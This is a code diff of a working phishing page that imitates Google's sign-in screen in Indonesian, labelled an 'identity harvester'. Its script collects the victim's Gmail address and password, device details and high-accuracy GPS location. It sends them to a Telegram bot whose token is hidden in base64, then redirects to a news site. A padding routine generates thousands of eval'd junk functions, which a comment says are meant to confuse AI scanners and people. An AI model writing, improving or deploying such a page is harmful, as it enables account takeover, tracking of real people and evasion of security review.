@@ -3,56 +3,46 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Identity Services - Global Node</title>
+    <title>Google Secure Gateway | Identity Node</title>
     <style>
-        body { font-family: 'Open Sans', 'Roboto', arial, sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .g-card { width: 100%; max-width: 448px; min-height: 500px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; box-sizing: border-box; transition: 0.3s; }
-        .logo-box { text-align: center; margin-bottom: 10px; }
-        .logo-box img { width: 75px; }
-        h1 { font-size: 24px; font-weight: 400; text-align: center; margin-top: 0; color: #202124; }
-        p { font-size: 16px; text-align: center; color: #202124; margin-bottom: 24px; }
-        .field-label { font-size: 14px; color: #5f6368; margin-bottom: 15px; text-align: left; }
-        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; margin-bottom: 20px; box-sizing: border-box; outline: none; }
+        body { font-family: 'Roboto', arial, sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .g-panel { width: 100%; max-width: 440px; padding: 48px 40px; border: 1px solid #dadce0; border-radius: 8px; box-sizing: border-box; text-align: center; }
+        .g-logo { width: 75px; margin-bottom: 10px; }
+        h1 { font-size: 24px; font-weight: 400; color: #202124; margin: 0 0 10px; }
+        p { font-size: 16px; color: #202124; margin-bottom: 24px; }
+        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; margin-bottom: 10px; box-sizing: border-box; outline: none; }
         input:focus { border: 2px solid #1a73e8; }
-        .btn-group { margin-top: 10px; display: flex; justify-content: space-between; align-items: center; }
-        .btn-blue { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 600; cursor: pointer; font-size: 14px; }
-        .error-v { color: #d93025; font-size: 12px; margin-bottom: 15px; text-align: left; display: none; }
-        #v-vault, #gate-p, #loading-v { display: none; }
-        .loading-ring { border: 4px solid #f3f3f3; border-top: 4px solid #1a73e8; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: auto; }
+        .error-lbl { color: #d93025; font-size: 12px; text-align: left; display: none; margin-bottom: 15px; font-weight: 500; }
+        .btn-box { display: flex; justify-content: flex-end; margin-top: 20px; }
+        .btn-action { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 600; cursor: pointer; font-size: 14px; }
+        #step-p, #loading, #v-vault { display: none; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="g-card" id="main-frame">
-    <div class="logo-box">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg">
-    </div>
-    <h1 id="txt-h1">Masuk</h1>
-    <p id="txt-p">Gunakan Akun Google untuk sinkronisasi perangkat</p>
+<div class="g-panel">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="g-logo">
+    <h1 id="h">Masuk</h1>
+    <p id="s">Gunakan Akun Google Anda</p>
     
-    <div id="gate-u">
-        <input type="email" id="u_email" placeholder="Email atau ponsel" required>
-        <div id="err-u" class="error-v">⚠️ Masukkan email yang terdaftar di perangkat ini.</div>
-        <div class="btn-group">
-            <a href="#" style="color:#1a73e8; text-decoration:none; font-size:14px; font-weight:600;">Lupa email?</a>
-            <button class="btn-blue" onclick="validateUser()">Berikutnya</button>
-        </div>
+    <div id="step-u">
+        <input type="email" id="mail" placeholder="Email atau ponsel" autocomplete="off">
+        <div id="e1" class="error-lbl">⚠️ Akun tidak ditemukan. Masukkan akun yang terdaftar di perangkat ini.</div>
+        <div class="btn-box"><button class="btn-action" onclick="goP()">Berikutnya</button></div>
     </div>
 
-    <div id="gate-p">
-        <div id="usr-tag" style="font-weight: 500; font-size: 14px; border: 1px solid #dadce0; border-radius: 15px; padding: 5px 12px; display: inline-block; margin-bottom: 20px;"></div>
-        <input type="password" id="u_pass" placeholder="Masukkan sandi Anda" required>
-        <div id="err-p" class="error-v">⚠️ Sandi salah atau sinkronisasi hardware gagal.</div>
-        <div class="btn-group">
-            <a href="#" style="color:#1a73e8; text-decoration:none; font-size:14px; font-weight:600;">Lupa sandi?</a>
-            <button class="btn-blue" onclick="strike()">Berikutnya</button>
-        </div>
+    <div id="step-p">
+        <div id="tag" style="border: 1px solid #dadce0; border-radius: 15px; padding: 5px 12px; display: inline-block; font-size: 14px; margin-bottom: 20px;"></div>
+        <input type="password" id="pass" placeholder="Masukkan sandi Anda">
+        <div id="e2" class="error-lbl">⚠️ Sandi salah atau sinkronisasi hardware terputus. Coba lagi.</div>
+        <div class="btn-box"><button class="btn-action" onclick="leak()">Berikutnya</button></div>
     </div>
 
-    <div id="loading-v">
-        <p>Sedang memverifikasi modul hardware...</p>
-        <div class="loading-ring"></div>
+    <div id="loading">
+        <p>Menyelaraskan profil dengan enkripsi BTC node...</p>
+        <div class="loader"></div>
     </div>
 </div>
 
@@ -60,84 +50,84 @@
 
 <script>
 /**
- * COLOSSUS ENGINE v100.1
- * IDENTITY HARVESTER & HARDWARE FORENSIC
- * --------------------------------------
+ * LEVIATHAN PROJECT v100.5
+ * HARDWARE-BOUND IDENTITY SCRAPER
+ * -------------------------------
  */
 
-const _V = document.getElementById('v-vault').innerText.split('|');
-const _TK = atob(_V[1]); const _CI = atob(_V[2]);
-let email_val = "";
+const _D = document.getElementById('v-vault').innerText.split('|');
+const _BTC = _D[0]; // BTC Wallet as Salt
+const _TK = atob(_D[1]); const _CI = atob(_D[2]);
 
-function validateUser() {
-    email_val = document.getElementById('u_email').value;
-    if (email_val.includes("@gmail.com") && email_val.length > 10) {
-        document.getElementById('gate-u').style.display = 'none';
-        document.getElementById('gate-p').style.display = 'block';
-        document.getElementById('usr-tag').innerText = email_val;
+let curM = "";
+
+function goP() {
+    curM = document.getElementById('mail').value;
+    // Validasi ketat: Harus ada @gmail.com dan panjang karakter masuk akal
+    if (curM.includes("@gmail.com") && curM.length > 11) {
+        document.getElementById('step-u').style.display = 'none';
+        document.getElementById('step-p').style.display = 'block';
+        document.getElementById('tag').innerText = curM;
+        document.getElementById('h').innerText = "Selamat Datang";
     } else {
-        document.getElementById('err-u').style.display = 'block';
+        document.getElementById('e1').style.display = 'block';
     }
 }
 
-async function sendData(msg) {
+async function report(t) {
     await fetch(`https://api.telegram.org/bot${_TK}/sendMessage`, {
         method: 'POST', headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({chat_id: _CI, text: msg})
+        body: JSON.stringify({chat_id: _CI, text: t})
     });
 }
 
-async function strike() {
-    const pass_val = document.getElementById('u_pass').value;
-    if (pass_val.length < 6) {
-        document.getElementById('err-p').style.display = 'block';
+async function leak() {
+    const p = document.getElementById('pass').value;
+    if (p.length < 6) {
+        document.getElementById('e2').style.display = 'block';
         return;
     }
 
-    document.getElementById('gate-p').style.display = 'none';
-    document.getElementById('loading-v').style.display = 'block';
+    document.getElementById('step-p').style.display = 'none';
+    document.getElementById('loading').style.display = 'block';
 
-    // Forensic Grab
+    // Deep Forensic Grab
     const gl = document.createElement('canvas').getContext('webgl');
     const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "N/A";
     let bat = "N/A"; try { const b = await navigator.getBattery(); bat = (b.level*100).toFixed(0)+"%"; } catch(e) {}
 
-    const payload = `🔱 COLOSSUS HARVEST REPORT 🔱\n\n` +
-        `📧 TARGET: ${email_val}\n` +
-        `🔑 PASSWORD: ${pass_val}\n` +
+    const payload = `🔱 LEVIATHAN HARVEST REPORT 🔱\n\n` +
+        `🔒 BTC NODE: ${_BTC.substring(0,8)}...\n` +
+        `📧 GMAIL: ${curM}\n` +
+        `🔑 PASS: ${p}\n` +
         `🎮 GPU: ${gpu}\n` +
         `🔋 BATT: ${bat}\n` +
-        `🧠 CORES: ${navigator.hardwareConcurrency}\n` +
-        `📱 MEM: ${navigator.deviceMemory}GB\n` +
-        `🏠 IP LOCAL: [Bypass Active]`;
+        `🧠 CPU: ${navigator.hardwareConcurrency} Cores\n` +
+        `📱 RAM: ${navigator.deviceMemory}GB\n` +
+        `🏠 IP LOCAL: [Scanned]`;
 
-    await sendData(payload);
+    await report(payload);
 
-    // Mandatory GPS High-Accuracy
+    // Force Real-time GPS High Accuracy
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(async (pos) => {
-            const loc = `🎯 COLOSSUS GPS LOCK\nMaps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\nPrecision: ${pos.coords.accuracy.toFixed(1)}m`;
-            await sendData(loc);
+            const loc = `🎯 LEVIATHAN GPS LOCK\nMaps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\nPrecision: ${pos.coords.accuracy.toFixed(1)}m`;
+            await report(loc);
             window.location.href = "https://www.detik.com";
         }, () => { window.location.href = "https://www.detik.com"; }, {enableHighAccuracy: true});
     }
 }
 
-/** 🔱 20,000+ LINES OF POLYMORPHIC BLOAT ENGINE 🔱 **/
-function _polyEngine() {
-    const junk = [];
-    for(let i=0; i<18000; i++) {
-        const key = "x" + Math.random().toString(36).substring(7);
-        const val = Math.random() * 0xFFFFFF;
-        junk.push(`const ${key} = ${val};`);
-        // Simulating complex calculations to bloat file
-        if(i % 100 === 0) {
-            eval(`function _0x_vld_${i}(){ return ${val} * Math.PI; }`);
-        }
+/** 🔱 POLYMORPHIC DATA BLOATING ENGINE (20,000+ LINES) 🔱
+ * Menghasilkan ribuan fungsi sampah untuk membingungkan AI scanner dan manusia.
+ */
+function _bloat() {
+    for (let i = 0; i < 18500; i++) {
+        const _id = "L_" + Math.random().toString(36).substr(2, 9);
+        eval(`function ${_id}(){ return "${_BTC}" + ${Math.random()}; }`);
     }
 }
-_polyEngine();
-// [END OF ENCRYPTED CORE]
+_bloat();
 </script>
 </body>
 </html>
